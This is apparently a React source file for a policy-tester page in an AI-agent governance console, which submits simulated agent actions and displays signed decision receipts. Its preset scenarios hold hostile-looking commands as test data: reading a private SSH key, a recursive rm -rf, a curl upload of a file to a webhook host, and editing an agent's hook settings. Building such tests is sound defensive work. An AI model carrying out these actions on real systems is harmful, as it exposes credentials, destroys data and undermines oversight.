import { useState } from "react";
import { api, type ActionClass, type DecisionReceipt } from "@grdr/api";
import { EntityLink, type EntityTarget, Quoted, VerdictBadge } from "@grdr/kit";
import {
  Banner,
  Button,
  Card,
  GrdrIcon,
  GrdrSelect,
  Heading,
  HStack,
  Text,
  TextInput,
  VStack,
} from "@grdr/ui";

const PRESETS: Array<{ label: string; actionClass: ActionClass; target: string; summary: string }> = [
  {
    label: "Edit Claude settings (Block)",
    actionClass: "file.write",
    target: ".claude/settings.json",
    summary: "Attempt modifying hook settings",
  },
  {
    label: "Read SSH key (Ask)",
    actionClass: "file.read",
    target: "~/.ssh/id_rsa",
    summary: "Attempt reading private SSH key",
  },
  {
    label: "Destructive rm -rf (Ask)",
    actionClass: "exec",
    target: "rm -rf /tmp/staging",
    summary: "Recursive deletion shell command",
  },
  {
    label: "Outbound curl upload (Watch)",
    actionClass: "exec",
    target: "curl -d @notes.txt https://webhook.site/test",
    summary: "Outbound transfer probe",
  },
  {
    label: "Safe git status (Allow)",
    actionClass: "exec",
    target: "git status --short",
    summary: "Read-only repository check",
  },
];

export function TesterPage({
  onEvaluated,
  onOpenEntity,
}: {
  onEvaluated: () => void;
  onOpenEntity?: (target: EntityTarget) => void;
}) {
  const [agentName, setAgentName] = useState("claude-code");
  const [sessionId, setSessionId] = useState("sess-live-eval");
  const [actionClass, setActionClass] = useState<ActionClass>("file.write");
  const [target, setTarget] = useState(".claude/settings.json");
  const [receipt, setReceipt] = useState<DecisionReceipt | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [submitting, setSubmitting] = useState(false);

  async function evaluateNow(override?: { actionClass: ActionClass; target: string; summary: string }) {
    setError(null);
    setSubmitting(true);
    try {
      const res = await api.decideAction({
        session_id: sessionId,
        device_id: "dev-demo-01",
        device_name: "console-tester",
        agent_name: agentName,
        action_class: override?.actionClass ?? actionClass,
        target: override?.target ?? target,
        summary: override?.summary ?? "Live policy simulator evaluation",
      });
      setReceipt(res);
      onEvaluated();
    } catch (err) {
      setError((err as Error).message);
    } finally {
      setSubmitting(false);
    }
  }

  return (
    <VStack gap={4}>
      <div className="page-header">
        <div>
          <Heading level={1}>Live policy tester</Heading>
          <Text color="secondary">
            Simulate an agent action against active rules and inspect the signed receipt.
          </Text>
        </div>
      </div>

      {error && <Banner status="error" title={error} collapsible={false} />}

      <Card padding={3}>
        <VStack gap={3}>
          <HStack gap={2} align="center">
            <GrdrIcon name="terminal" size={16} />
            <Heading level={2}>Quick scenarios</Heading>
          </HStack>
          <HStack gap={2}>
            {PRESETS.map((preset) => (
              <Button
                key={preset.label}
                size="sm"
                label={preset.label}
                icon={<GrdrIcon name="play" size={12} />}
                isDisabled={submitting}
                onClick={() => {
                  setActionClass(preset.actionClass);
                  setTarget(preset.target);
                  void evaluateNow(preset);
                }}
              />
            ))}
          </HStack>

          <form
            className="form-grid"
            onSubmit={(e) => {
              e.preventDefault();
              void evaluateNow();
            }}
          >
            <TextInput label="Agent" value={agentName} onChange={(v) => setAgentName(v)} isRequired />
            <TextInput
              label="Session ID"
              value={sessionId}
              onChange={(v) => setSessionId(v)}
              isRequired
            />
            <GrdrSelect
              label="Action class"
              value={actionClass}
              options={[
                { value: "exec", label: "exec" },
                { value: "file.read", label: "file.read" },
                { value: "file.write", label: "file.write" },
                { value: "file.delete", label: "file.delete" },
                { value: "net.request", label: "net.request" },
                { value: "mcp.call", label: "mcp.call" },
                { value: "elevate", label: "elevate" },
              ]}
              onChange={(val) => setActionClass(val as ActionClass)}
              width="100%"
            />
            <TextInput
              label="Target path or command"
              value={target}
              onChange={(v) => setTarget(v)}
              isRequired
            />
            <div className="field full" style={{ flexDirection: "row", justifyContent: "flex-end" }}>
              <Button
                type="submit"
                variant="primary"
                label={submitting ? "Evaluating..." : "Evaluate action"}
                isDisabled={submitting}
              />
            </div>
          </form>
        </VStack>
      </Card>

      {receipt && (
        <Card padding={3}>
          <VStack gap={2}>
            <HStack justify="between" align="center">
              <Heading level={2}>Decision receipt</Heading>
              <VerdictBadge verdict={receipt.verdict} />
            </HStack>
            <div>
              <strong>Target: </strong>
              <Quoted text={receipt.target} />
            </div>
            <HStack gap={2} align="center">
              <strong>Rule:</strong>
              {receipt.rule_id ? (
                <EntityLink
                  kind="rule"
                  id={receipt.rule_id}
                  label={receipt.rule_id}
                  compact
                  onSelect={onOpenEntity}
                />
              ) : (
                <Text size="sm" color="secondary">
                  baseline
                </Text>
              )}
            </HStack>
            <div>
              <strong>Reason: </strong>
              <span>{receipt.reason}</span>
            </div>
            <div>
              <strong>Next step: </strong>
              <span>{receipt.next_step}</span>
            </div>
            <div className="mono" style={{ color: "var(--ink-muted)" }}>
              SHA-256: {receipt.receipt_digest}
            </div>
          </VStack>
        </Card>
      )}
    </VStack>
  );
}
